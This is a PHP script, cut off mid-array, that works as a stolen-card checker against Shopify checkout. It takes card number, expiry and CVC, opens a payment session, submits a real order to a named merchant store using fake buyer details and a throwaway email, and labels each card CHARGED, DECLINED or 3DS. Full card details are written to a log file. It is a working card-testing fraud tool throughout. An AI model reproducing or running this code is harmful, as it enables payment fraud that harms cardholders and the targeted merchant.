<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging (disable in production)
 $log_file = __DIR__ . '/shopify23$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check a single card via Shopify API with parallel processing support
function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    log_message("Checking card: $card_details");

    for ($attempt = 0; $attempt <= $retry; $attempt++) {
        try {
            // Step 1: Create a session
            $session_token = createShopifySession($card_number, $exp_month, $exp_year, $cvc);
            if (!$session_token) {
                log_message("Failed to create session for $card_details");
                return "DECLINED [Failed to create session] $card_details";
            }
            
            // Step 2: Submit for completion
            $receipt_id = submitForCompletion($session_token, $card_number, $exp_month, $exp_year, $cvc);
            if (!$receipt_id) {
                log_message("Failed to submit for completion for $card_details");
                return "DECLINED [Failed to submit for completion] $card_details";
            }
            
            // Step 3: Poll for receipt
            $result = pollForReceipt($receipt_id, $session_token);
            if (!$result) {
                log_message("Failed to get receipt for $card_details");
                return "DECLINED [Failed to get receipt] $card_details";
            }
            
            // Process the result
            $status = 'DECLINED';
            $message = 'Unknown error';
            
            if (isset($result['data']['receipt'])) {
                $receipt = $result['data']['receipt'];
                
                if (isset($receipt['__typename']) && $receipt['__typename'] === 'ProcessedReceipt') {
                    $status = 'CHARGED';
                    $message = 'Payment successfully processed';
                    
                    // Get payment details if available
                    if (isset($receipt['paymentDetails'])) {
                        $paymentDetails = $receipt['paymentDetails'];
                        if (isset($paymentDetails['paymentCardBrand'])) {
                            $message .= ' - Card: ' . $paymentDetails['paymentCardBrand'];
                        }
                        if (isset($paymentDetails['creditCardLastFourDigits'])) {
                            $message .= ' ****' . $paymentDetails['creditCardLastFourDigits'];
                        }
                        if (isset($paymentDetails['paymentAmount'])) {
                            $amount = $paymentDetails['paymentAmount'];
                            if (isset($amount['amount']) && isset($amount['currencyCode'])) {
                                $message .= ' - Amount: ' . $amount['amount'] . ' ' . $amount['currencyCode'];
                            }
                        }
                    }
                } elseif (isset($receipt['__typename']) && $receipt['__typename'] === 'FailedReceipt') {
                    $status = 'DECLINED';
                    $message = 'Payment failed';
                    
                    if (isset($receipt['processingError'])) {
                        $error = $receipt['processingError'];
                        if (isset($error['__typename'])) {
                            $errorType = $error['__typename'];
                            if ($errorType === 'PaymentFailed' && isset($error['messageUntranslated'])) {
                                $message = $error['messageUntranslated'];
                            }
                        }
                    }
                } elseif (isset($receipt['__typename']) && $receipt['__typename'] === 'ActionRequiredReceipt') {
                    $status = '3DS';
                    $message = '3D Secure authentication required';
                }
            }
            
            $response_msg = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
            log_message("$status for $card_details: $response_msg");
            return "$status [$response_msg] $card_details";
            
        } catch (Exception $e) {
            log_message("Exception on attempt " . ($attempt + 1) . " for $card_details: " . $e->getMessage());
            if ($attempt < $retry) {
                sleep(2); // Wait before retry
                continue;
            }
            return "DECLINED [Exception: " . $e->getMessage() . "] $card_details";
        }
    }

    log_message("Failed after retries for $card_details");
    return "DECLINED [API request failed after retries] $card_details";
}

// Function to create a Shopify session
function createShopifySession($card_number, $exp_month, $exp_year, $cvc) {
    $url = 'https://checkout.pci.shopifyinc.com/sessions';
    
    $headers = [
        'accept: application/json',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/json',
        'origin: https://checkout.pci.shopifyinc.com',
        'priority: u=1, i',
        'referer: https://checkout.pci.shopifyinc.com/build/102f5ed/number-ltr.html?identifier=&locationURL=&localFonts[]=%7B%22name%22%3A%22Lato%22%2C%22source%22%3A%22local(%27Lato%20Regular%27)%2C%20local(%27Lato-Regular%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.c3b93d431f0091c8be23185e15c9d1fee1e971c5.woff2%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Dc95fc2c7a817392abba851cc430429100da8cbcd76b814750792c595b9789084)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.d5c00c781efb195594fd2fd4ad04f7882949e327.woff%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Ddfd4096831f7204e44b129f6061f17ee921f43021a25b23b3130d65d230953b6)%20format(%27woff%27)%22%7D&localFonts[]=%7B%22name%22%3A%22Lato%22%2C%22source%22%3A%22local(%27Lato%20Regular%27)%2C%20local(%27Lato-Regular%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.c3b93d431f0091c8be23185e15c9d1fee1e971c5.woff2%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Dc95fc2c7a817392abba851cc430429100da8cbcd76b814750792c595b9789084)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.d5c00c781efb195594fd2fd4ad04f7882949e327.woff%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Ddfd4096831f7204e44b129f6061f17ee921f43021a25b23b3130d65d230953b6)%20format(%27woff%27)%22%7D',
        'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-fetch-storage-access: active',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    ];
    
    $data = [
        'credit_card' => [
            'number' => $card_number,
            'month' => (int)$exp_month,
            'year' => (int)$exp_year,
            'verification_value' => $cvc,
            'start_month' => null,
            'start_year' => null,
            'issue_number' => '',
            'name' => 'Darkboy'
        ],
        'payment_session_scope' => 'vanguardmil.com'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error || $http_code !== 200) {
        log_message("Session creation failed: HTTP $http_code, Error: $curl_error, Response: " . substr($response, 0, 200));
        return false;
    }
    
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['id'])) {
        log_message("Invalid session response: " . substr($response, 0, 200));
        return false;
    }
    
    return $result['id'];
}

// Function to submit for completion
function submitForCompletion($session_token, $card_number, $exp_month, $exp_year, $cvc) {
    $url = 'https://www.vanguardmil.com/checkouts/unstable/graphql?operationName=SubmitForCompletion';
    
    $headers = [
        'accept: application/json',
        'accept-language: en-US',
        'content-type: application/json',
        'origin: https://www.vanguardmil.com',
        'priority: u=1, i',
        'referer: https://www.vanguardmil.com/',
        'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'shopify-checkout-client: checkout-web/1.0',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'x-checkout-one-session-token: ' . $session_token,
        'x-checkout-web-build-id: 1425498c9f082684649666eafda564f07561d25c',
        'x-checkout-web-deploy-stage: production',
        'x-checkout-web-server-handling: fast',
        'x-checkout-web-server-rendering: yes',
        'x-checkout-web-source-id: hWN1DD0iR9Rfnqmheh7rVKMb'
    ];
    
    $data = [
        'query' => 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
        'variables' => [
            'input' => [
                'sessionInput' => [
                    'sessionToken' => $session_token
                ],
                'queueToken' => 'A0BuViNF5uWuojW64-m4dv3G7CbZ8SY9ekvTyHZLbEUgccVE8Hqv2x3N6_xX_gez1xCHNoNlHmMlGZz6Z0KiJvSEZb23F7EG3xsHLyBc-1x2A_My',
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'destination' => [
                                'streetAddress' => [
                                    'address1' => 'New York',
                                    'address2' => 'New York',
                                    'city' => 'New York',
                                    'countryCode' => 'US',
                                    'postalCode' => '10200',
                                    'firstName' => 'Dark',
                                    'lastName' => 'Boy',
                                    'zoneCode' => 'NY',
                                    'phone' => '9685698569',
                                    'oneTimeUse' => false
                                ]
                            ],
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyByHandle' => [
                                    'handle' => '84b346bc8248a38a15eb63cb0acbfaf5-637d968cc49b21b877b3f8441beae1e1',
                                    'customDeliveryRate' => false
                                ],
                                'options' => [
                                    'phone' => '9685698569'
                                ]
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => '34cdbe59-7c4a-4616-ae8f-b273b8b97e29'
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'SHIPPING'
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => '19.80',
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'destinationChanged' => false
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => '34cdbe59-7c4a-4616-ae8f-b273b8b97e29',
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/12379973845046',
                                    'variantId' => 'gid://shopify/ProductVariant/12379973845046',
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => '3.50',
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'memberships' => [
                    'memberships' => []
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => 'c0a70d7e63ffa84b8b32deb8d72a686f',
                                    'sessionId' => 'west-bd6eca1c027ee66479ac2284d5e70eaa',
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => 'New York',
                                            'address2' => 'New York',
                                            'city' => 'New York',
                                            'countryCode' => 'US',
                                            'postalCode' => '10200',
                                            'firstName' => 'Dark',
                                            'lastName' => 'Boy',
                                            'zoneCode' => 'NY',
                                            'phone' => '9685698569'
                                        ]
                                    ],
                                    'cardSource' => null
                                ]
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => '23.3',
                                    'currencyCode' => 'USD'
                                ]
                            ]
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => 'New York',
                            'address2' => 'New York',
                            'city' => 'New York',
                            'countryCode' => 'US',
                            'postalCode' => '10200',
                            'firstName' => 'Dark',
                            'lastName' => 'Boy',
                            'zoneCode' => 'NY',
                            'phone' => '9685698569'
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'USD',
                        'countryCode' => 'IN'
                    ],
                    'email' => 'kjbksefb@gmail.com',
                    'emailChanged' => false,
                    'phoneCountryCode' => 'IN',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'number' => '9685698569',
                        'countryCode' => 'IN'
                    ],
                    'rememberMe' => false
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => '0',
                            'currencyCode' => 'USD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ],
                'cartMetafields' => []
            ],
            'attemptToken' => 'hWN1DD0iR9Rfnqmheh7rVKMb-rjza6xfief',
            'metafields' => [
                [
                    'key' => 'views',
                    'namespace' => 'checkoutblocks',
                    'value' => '{"blocks":["68701fd10734c931da8bd522","669808171ccb91cf0ee2a23c"]}',
                    'valueType' => 'JSON_STRING',
                    'appId' => 'gid://shopify/App/4748640257'
                ]
            ],
            'analytics' => [
